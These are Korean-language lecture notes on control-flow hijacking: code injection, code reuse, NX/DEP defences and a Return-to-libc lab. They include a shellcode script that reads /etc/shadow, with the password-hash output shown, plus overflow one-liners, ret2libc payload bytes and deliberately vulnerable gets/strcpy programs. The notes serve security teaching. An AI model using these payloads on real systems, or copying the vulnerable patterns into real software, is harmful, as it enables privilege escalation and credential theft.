#### Control Flow

- 개념
  - 프로그램의 개별 문장, 명령어 또는 함수 호출이 실행되거나 평가되는 순서
- Control Flow Graphs (CFG)
  - 프로그램의 제어 흐름을 방향 그래프(Directed Graph)로 표현한 것
  - 구성요소
    - Basic Block: 중간에 분기하거나 다른 위치에서 진입하지 않고, 명령어들이 순차적으로 실행되는 하나의 묶음
      - 진입점: 가장 먼저 실행되는 명령어
      - 종료점: 가장 마지막에 실행되는 명령어
    - Node: Basic Block을 나타냄
    - Edge: Basic Block 사이의 제어 흐름 경로를 나타냄

#### Control Hijacking Attack (= Control-flow Hijacking Attack)

- 개념
  - 원래 의도된 제어 흐름에서 벗어나 **공격자가 선택한 위치로 프로그램 실행을 변경**하는 공격
- 특징
  - 실행 중에 발생하는 공격(Runtime Exploit)
  - 보통 반환 주소(Return Address), 함수 포인터(Function Pointer)등의 제어 흐름 데이터를 손상
    → EIP/RIP(CPU가 실행할 명령어의 위치를 나타내는 레지스터) 영향
- 공격 유형
  | 구분      | Code Injection       | Code Reuse                               |
  | --------- | -------------------- | ---------------------------------------- |
  | 방식      | 악성 코드를 삽입     | 기존 코드를 재사용                       |
  | 실행 대상 | 공격자가 주입한 코드 | 프로그램·라이브러리에 이미 존재하는 코드 |
  | 대표 예시 | Shellcode 실행       | Return-to-libc, ROP                      |

===============================================================

[Function Pointer 개념 설명]

```
#include <stdio.h>

void fun(int a) {
    printf("Value of a is %d\n", a);
}

int main(void) {
    void (*fun_ptr)(int) = fun;  **// fun() 함수를 가리키는 함수 포인터**

    **// 위 선언과 대입은 다음 두 줄과 동일
    // void (*fun_ptr)(int);
    // fun_ptr = &fun;**

    (*fun_ptr)(10);  **// 함수 포인터를 통해 함수 호출, fun(10)과 동일**

    return 0;
}
```

```
#include <stdio.h>

int (*v)(int); **// v는 함수 자체가 아니라 함수를 가리킬 수 있는 포인터 변수**

int f(int x) {
    return x + 1;
}

void main(void) {
    v = f;
    printf("%d\n", (*v)(3));
}
```

===============================================================

#### Code Injection Attack

- 개념
  - Code Hijacking Attack의 하위 유형
  - 프로그램의 정상적인 제어 흐름을 변경하여 이전에 삽입된 악성 코드가 실행되도록 하는 공격
  - Shellcode
    - 공격자가 원하는 동작을 수행하도록 작성한 기계어 코드
      - Process, OS 종속적
    - 일반적으로 오버플로가 발생하는 버퍼에 저장
- 원리
  - CFG 관점
    - 정상: Basic Block A → Basic Block B
    - 공격: Basic Block A → 악성 코드 D
  - 핵심 과정
    1. 악성 코드를 삽입
    2. 버퍼 오버플로 같은 취약점을 이용
    3. 반환 주소 또는 함수 포인터 등의 제어 흐름 데이터를 변조
    4. 정상적인 실행 경로를 벗어나 악성 코드가 실행
- 취약한 코드 예시 (buffer5)
  ```
  typedef struct chunk {
      char inp[64];               // 사용자 입력 버퍼
      void (*process)(char *);    // 입력 처리 함수 포인터
  } chunk_t;

  void showlen(char *buf) {...}

  int main(int argc, char *argv[])
  {
      chunk_t *next;

      setbuf(stdin, NULL);
      next = malloc(sizeof(chunk_t));
      next->process = showlen;         // process -> showlen 함수
      printf("Enter value: ");
      gets(next->inp);                 // gets()는 입력 길이 제한 X
      next->process(next->inp);        // 포인터 변조 시 공격자의 악성 코드로 이동
      printf("buffer5 done\n");
  }
  ```

  1. 공격자가 64byte 넘는 길이의 입력값을 입력
  2. gets() 함수는 입력 길이 제한 X → process(함수 포인터) 변조 가능성
  3. process 변조 → 공격자 의도한 악성 코드를 가리킴
- 공격 명령어/스크립트 예시
  - 스크립트 (attack2)
    ```
    #!/bin/sh
    # implement heap overflow against program buffer5
    perl -e 'print pack("H*",
    "90909090909090909090909090909090" .
    "9090eb1a5e31c08846078d1e895e0889" .
    "460cb00b89f38d4e088d560ccd80e8e1" .
    "ffffff2f62696e2f7368202020202020" .
    "**b89704080a**");
    print "whoami\n";
    print "cat /etc/shadow\n";
    ```

    - Heap Overflow 유발하는 입력 데이터 → 함수 포인터를 공격 코드가 위치한 주소로 변경
    - x86은 Little-endian, 메모리에는 주소 바이트가 역순으로 저장 **(기존 0x080497b8)**
  - 공격 명령어
    ```
    $ attack2 | buffer5
    Enter value:
    root
    root:$1$4oInnyeh$T3BVS2E3OyNRGjGUzF4o3/:13347:0:99999:7:::
    daemon:*:11453:0:99999:7:::
    ...
    nobody:*:11453:0:99999:7:::
    ...
    ```

    - `attack2`의 출력 결과를 `buffer5` 프로그램의 입력으로 전달하여 실행 (Pipe)
    - whoami, cat /etc/shadow → shadow에 저장된 정보가 출력됨

#### Code Reuse Attack

- 개념
  - Code Hijacking Attack의 하위 유형
  - 프로그램의 원래 의도된 제어 흐름을 변경하여 **기존 프로그램 코드 내부의 의도하지 않은 실행 경로를 호출하도록 하는 공격**
- 원리
  - Injection vs Reuse
    - 정상: 기존 코드 A → 기존 코드 B
    - Injection: 기존 코드 A → **삽입 코드 D**
    - Reuse: 기존 코드 A → **기존 코드 C**
- 공격 기법
  - Return-to-Libc Attacks (Ret2Libc): 기존 C 라이브러리 함수들을 재사용
  - Return-Oriented Programming (ROP): 짧은 코드 조각(Gadget)을 연결
  - Jump-Oriented Programming (JOP): 점프 명령어를 활용하여 코드 조각들을 연결
- 발전 과정
  1. 초기 Code Reuse 공격은 기존 라이브러리 함수 전체를 재사용하는 Ret2Libc
  2. 이후 기존 함수들을 연결하는 방식이 발전 → ROP 등으로 확장
- Heap Buffer Overflow vs Stack Buffer Overflow
  - **이미 존재하는 코드를 실행한다는 점에서 Code-Reuse Attack에 해당**
  - 예시
    | 구분           | Heap Overflow                           | Stack Overflow                           |
    | -------------- | --------------------------------------- | ---------------------------------------- |
    | 변경 대상      | 함수 포인터(Function Pointer)           | 반환 주소(Return Address)                |
    | 실행 대상      | 프로그램 내부의 `runsh()`               | libc 내부의 `system()`                   |
    | 핵심 공격 방식 | 간접 호출 탈취(Indirect Call Hijacking) | 반환 주소 탈취(Return Address Hijacking) |
- Heap Overflow 공격 예시
  ```
  typedef struct chunk {
      char inp[8];
      void (*proc)(char *);
  } chunk_t;

  void showbuf(char *buf) {
      printf("buf = %s\n", buf);
  }

  void runsh(char *buf) {
      system("/bin/sh");
      printf("buf = %s\n", buf);
  }

  int main(int argc, char *argv[])
  {
  		chunk_t *next;

  		next = malloc(sizeof(chunk_t));
  		printf("inp=%p, proc=%p\n", next->inp, &(next->proc));
  		printf("runsh =%p\n", runsh);
  		next->proc = showbuf;
  		next->proc(next->inp);

  		strcpy(next->inp, argv[1]);
  		next->proc(next->inp);
  		printf("Heap buffer done\n");
  }

  ```

  1. 처음에 proc은 showbuf()를 가리킴
  2. strcpy() 로 8바이트 이상의 문자열을 복사 → proc 변조 (showbuf 주소 → runsh 주소)
  3. `next->proc(next->inp)`를 실행하면 의도하지 않은 `runsh()`가 호출
     - runsh() 는 프로그램에 원래 존재하는 함수
- 공격 명령어 예시
  - `./heap_bof `perl -e 'print "A"x8, "\xdb\x06\x40\x00"'``
    - `"A"x8`: inp[8] 을 채우는 데이터
    - `\xdb\x06\x40\x00`: runsh() 의 주소 0x004006db를 little-endian으로 표현한 바이트
    - 입력이 버퍼를 넘어 함수 포인터 영역까지 기록되면서 proc 값 변경

#### W^X 정책

- 개념
  - 하나의 메모리 페이지에 쓰기 권한과 실행 권한을 동시에 부여하지 않는 것
  - W는 Write(쓰기), X는 Execute(실행)
- 원리
  | 메모리 권한 | 쓰기   | 실행            |
  | ----------- | ------ | --------------- |
  | RW-         | 가능   | 불가능          |
  | R-X         | 불가능 | 가능            |
  | RWX         | 가능   | 가능 (W^X 위반) |
  - Stack에 쓰기만 허용하고 실행은 금지하면, Shellcode가 저장되더라도 실행할 수 없음

#### DEP, NX Bit 관계

- NX Bit
  - 해당 메모리 페이지에서 명령어 실행을 금지하는 비트
  - 데이터 저장은 가능 → 저장된 데이터를 CPU가 명령어로 실행하지 못하게 함
    - NX로 Code Injection을 방어하더라도, Code Reuse의 Ret2Libc나 ROP 공격은 여전히 가능할 수 있음
- DEP & NX Bit
  - DEP는 실행 방지 정책, NX 비트는 이를 구현하는 주요 하드웨어 수단
  - DEP(Data Execution Prevention): 데이터 영역의 코드 실행을 방지하는 보안 기능
  - NX Bit: 메모리 페이지의 실행을 금지하는 하드웨어 비트

#### Non-executable Stack 방어기법

- 실행 가능 stack
  ```
  gcc -z execstack shellcode.c
  a.out
  $  ← Got a new shell!
  ```

  - `-z execstack`: 실행 가능한 스택을 요청하는 컴파일·링크 옵션
  - 실행 결과 새로운 셸이 실행
- 실행 불가 stack (Non-executable Stack)
  ```
  gcc -z noexecstack shellcode.c
  a.out
  Segmentation fault (core dumped)
  ```

  - `z noexecstack`: 실행 불가능한 스택을 요청하는 옵션
  - 실행 결과 세그멘테이션 오류가 발생
- 방어기법 우회 방법
  !image.png
  - 버퍼 오버플로로 반환 주소를 Shared Library로 변경
  - **실행 불가능한 스택 대신 실행 가능한 공유 라이브러리의 `system()` 함수로 이동**

#### Return-to-Libc 공격

- 기본 원리
  !image.png
  - 공격자가 Overflow 공격 → stack과 환경변수 영역 수정
  - 공격 결과
    - system 함수 주소, exit 함수 주소, shell 명령 문자열의 주소 배치
    - 환경 변수에는 SHELL = /bin/sh 저장
- 과정
  1. **Buffer Overflow 취약점 이용한 공격**

     ```
     void echo() {
         char buffer[80];
         gets(buffer);
         puts(buffer);
     }
     ```

     - gets() 는 입력 길이를 검사하지 않음 → 취약점 함수
     - 80바이트를 초과하는 입력이 들어오면 버퍼 밖의 스택 영역까지 덮어쓸 수 있음
       - Saved EBP, Return Address

  2. **반환 주소 변조**

     !image.png
     - 80byte 초과 입력 → Stack Overwrite 발생
       - Pattern 1: 지역 버퍼를 채우는 데이터.
       - Pattern 2: 버퍼와 반환 주소 사이의 영역을 채우는 데이터.
       - New Return Address: 공격자가 설정한 새로운 반환 주소.
     - echo() 반환 주소를 system()의 주소로 변경

  3. **system()의 인자 배치**
     - system 반환주소 변경으로는 한계 → `system()`은 실행할 명령어를 인자로 받아야 함

     !image.png
     - 3가지 주소 필요
       - system() 주소 → 실행할 함수
       - exit() 주소 → `system()` 종료 후 실행할 함수
       - /bin/sh 주소 → `system()`에 전달할 문자열 인자
     - `/bin/sh`는 환경 변수 영역에 이미 존재

  4. 총 과정 설명

     !image.png
     - 실행 순서
       1. 공격자가 입력을 통해 `echo()`의 반환 주소를 `system()` 주소로 변경
       2. `echo()`의 실행이 끝나고 `ret` 명령어가 실행
       3. CPU가 변조된 반환 주소를 사용하여 `system()`으로 이동
       4. `system()`이 `/bin/sh`를 인자로 받아 셸을 실행
     - **새로운 Shellcode를 실행한 것이 아니라 기존 libc의 system()을 실행함**
     - NX가 활성화되어 있어도 이러한 공격이 가능
       - `echo()`가 반환하면서 `system("/bin/sh")`가 실행되는 효과
- 공격자의 공격 데이터 구조
  ```
  "A"*80 + "B"*4 +
  "\x30\xf4\xe5\xb7" +
  "\xb0\x2f\xe5\xb7" +
  "\x8c\xfe\xff\xbf"
  ```
  !image.png
  - 스택의 특정 위치에 함수 주소와 인자 주소가 놓이도록 구성
- NX 우회 가능한 이유
  - NX는 스택에서 기계어 코드를 실행을 제한
  - system()은 스택이 아니라 **이미 실행 권한이 있는 libc 라이브러리 영역에 존재**
  “Return-to-libc는 NX를 끄는 공격이 아니라, NX가 금지하지 않는 기존 코드의 실행을 악용”

## 1. 환경 설정 및 사전 작업

### ① 취약한 프로그램 구조

```
int vul_func(char *str) {
    char buffer[50];
    strcpy(buffer, str);
    return 1;
}
```

- `main()`: `badfile`에서 최대 200바이트를 읽어 `vul_func()`에 전달.
- `vul_func()`: 50바이트 버퍼에 길이 검사 없이 `strcpy()` 수행.
- 취약점: 입력이 버퍼 크기를 초과하면 Saved EBP와 Return Address까지 덮어쓸 수 있음.

!image.png

### ② 실험 보안 환경

| 보안 기능  | 설정     | 의미                      |
| ---------- | -------- | ------------------------- |
| NX         | 활성화   | 스택에서 코드 실행 불가   |
| StackGuard | 비활성화 | 스택 보호 검사 해제       |
| ASLR       | 비활성화 | 주소 무작위화 해제        |
| Set-UID    | 활성화   | 파일 소유자 권한으로 실행 |

실험에서는 NX가 활성화된 상태에서도 Return-to-libc가 성립하는지 확인한다. 나머지 주요 보호 기능은 실험을 위해 비활성화한다.

### ③ Return-to-libc 공격 원리

스택의 반환 주소를 기존 libc 함수 주소로 변경하여 새로운 코드를 삽입하지 않고 실행 흐름을 탈취한다.

!image.png

- 공격에 필요한 3가지 작업
  | Task | 목적                                  |
  | ---- | ------------------------------------- |
  | A    | `system()` 및 `exit()` 함수 주소 확인 |
  | B    | `/bin/sh` 문자열 주소 확인            |
  | C    | 함수 호출 규약에 맞게 인자 위치 구성  |

## 2. Task A — `system()` 주소 찾기

### ① GDB를 통한 함수 주소 확인

```
(gdb) p system
(gdb) p exit
```

- `p`: print 명령어.
- CPU는 함수 이름이 아니라 메모리 주소를 통해 해당 함수의 명령어를 실행함.

| 함수       | 주소 (실험 예시) | 역할                             |
| ---------- | ---------------- | -------------------------------- |
| `system()` | `0xb7e5f430`     | `/bin/sh` 실행                   |
| `exit()`   | `0xb7e52fb0`     | `system()` 종료 후 프로그램 종료 |

### ② 주소가 필요한 이유

반환 주소를 `system()`의 주소로 변경하면, `vul_func()` 종료 시 `ret`에 의해 `system()`으로 제어 흐름이 이동한다.

`exit()` 주소는 `system()` 실행 이후의 반환 위치로 사용한다.

핵심: `system()`은 실행할 함수의 주소, `exit()`은 그 함수가 종료된 후 이동할 주소이다.

## 3. Task B — `/bin/sh` 문자열 주소 찾기

### ① 환경 변수에 문자열 저장

```
export MYSHELL="/bin/sh"
```

- `system()`은 실행할 명령 문자열을 인자로 받음.
- 환경 변수 `MYSHELL`에 `/bin/sh` 저장.
- 프로그램 실행 시 해당 환경 변수 문자열이 스택에 배치됨.

### ② `getenv()`를 이용한 주소 확인

```
char *shell = (char *)getenv("MYSHELL");
```

- `getenv()`: 환경 변수의 값이 저장된 위치를 가리키는 포인터 반환.
- `shell`: `/bin/sh` 문자열의 시작 주소를 저장.

```
Value:   /bin/sh
Address: bffffe8c
```

| 구분         | 의미                 |
| ------------ | -------------------- |
| `/bin/sh`    | 실제 명령 문자열     |
| `0xbffffe8c` | 문자열의 메모리 주소 |

`system()`의 인자로는 문자열 자체가 아니라 문자열을 가리키는 포인터가 전달된다.

### ③ 환경 변수 주소가 달라지는 이유

| 프로그램 이름 | 환경 변수 주소 |
| ------------- | -------------- |
| `env55`       | `0xbffffe8c`   |
| `env7777`     | `0xbffffe88`   |

프로그램 실행 시 스택에 프로그램 인자와 환경 변수가 함께 배치되므로, 프로그램 이름 길이에 따라 환경 변수 주소가 달라질 수 있다.

GDB 메모리 조사 명령어:

```
x/100s *((char **) environ)
```

- `x`: 메모리 조사
- `100`: 출력할 항목 수
- `s`: 문자열 형식
- `environ`: 환경 변수 목록과 관련된 포인터

핵심: `/bin/sh` 문자열 주소를 알아야 `system()`의 인자로 전달할 수 있으며, 해당 주소는 실행 환경에 따라 달라질 수 있다.

## 4. Task C — `system()` 인자 배치

### ① x86 32비트 cdecl 호출 규약

함수 인자는 스택을 통해 전달하며, 함수 프롤로그 이후 첫 번째 인자는 `EBP+8`에 위치한다.

!image.png

- 32비트 환경에서 주소 및 EBP는 각각 4바이트.
- 프롤로그 이전에는 첫 번째 인자가 `ESP+4`에 위치.
- 프롤로그 이후에는 `EBP+8`에 위치.

### ② Function Prologue — 스택 프레임 생성

```
pushl %ebp
movl  %esp, %ebp
subl  $N, %esp
```

| 명령어            | 동작                   | 결과                     |
| ----------------- | ---------------------- | ------------------------ |
| `pushl %ebp`      | 기존 EBP를 스택에 저장 | ESP 4바이트 감소         |
| `movl %esp, %ebp` | 현재 ESP를 EBP에 복사  | 새 스택 프레임 기준 설정 |
| `subl $N, %esp`   | ESP에서 N바이트 감소   | 지역 변수 공간 확보      |

ESP vs. EBP

- `ESP`: 현재 스택 최상단을 가리키며 스택 사용에 따라 변경.
- `EBP`: 현재 함수의 스택 프레임 기준 주소.

### ③ Function Epilogue — 스택 프레임 정리

```
movl %ebp, %esp
popl %ebp
ret
```

| 명령어            | 동작                   | 결과                             |
| ----------------- | ---------------------- | -------------------------------- |
| `movl %ebp, %esp` | ESP를 EBP 위치로 이동  | 지역 변수 공간 정리              |
| `popl %ebp`       | 저장된 이전 EBP 복원   | ESP 4바이트 증가                 |
| `ret`             | 반환 주소를 EIP에 저장 | ESP 4바이트 증가, 실행 흐름 이동 |

Return-to-libc와의 관계

`ret`은 스택에 저장된 반환 주소를 다음 명령어 주소로 사용한다. 따라서 반환 주소가 `system()`으로 변조되어 있으면 해당 함수로 제어 흐름이 이동한다.

### ④ 전체 공격 흐름

!image.png
